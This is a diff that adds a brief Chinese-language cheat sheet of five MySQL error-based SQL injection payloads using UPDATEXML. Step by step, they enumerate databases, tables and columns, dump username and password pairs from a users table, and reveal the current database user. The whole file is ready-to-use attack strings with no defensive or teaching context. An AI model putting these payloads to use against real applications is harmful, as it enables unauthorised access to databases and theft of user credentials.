@@ -1,0 +1,14 @@
+1、获取所有数据库：
+(UPDATEXML(2920,CONCAT(0x7e,(SELECT+GROUP_CONCAT(schema_name)+FROM+information_schema.schemata),0x7e,(SELECT+(ELT(123=123,1)))),8357))
+
+2、获取当前数据库的所有表名
+(UPDATEXML(2920,CONCAT(0x7e,(SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables+WHERE+table_schema=database()),0x7e,(SELECT+(ELT(123=123,1)))),8357))
+
+3、获取指定表的列名
+(UPDATEXML(2920,CONCAT(0x7e,(SELECT+GROUP_CONCAT(column_name)+FROM+information_schema.columns+WHERE+table_name='access_do'),0x7e,(SELECT+(ELT(123=123,1)))),8357))
+
+4、获取值
+(UPDATEXML(2920,CONCAT(0x7e,(SELECT+GROUP_CONCAT(username,0x3a,password)+FROM+users),0x7e,(SELECT+(ELT(123=123,1)))),8357))
+
+5、当前数据库用户
+(UPDATEXML(2920,CONCAT(0x7e,user(),0x7e,(SELECT+(ELT(123=123,1)))),8357))
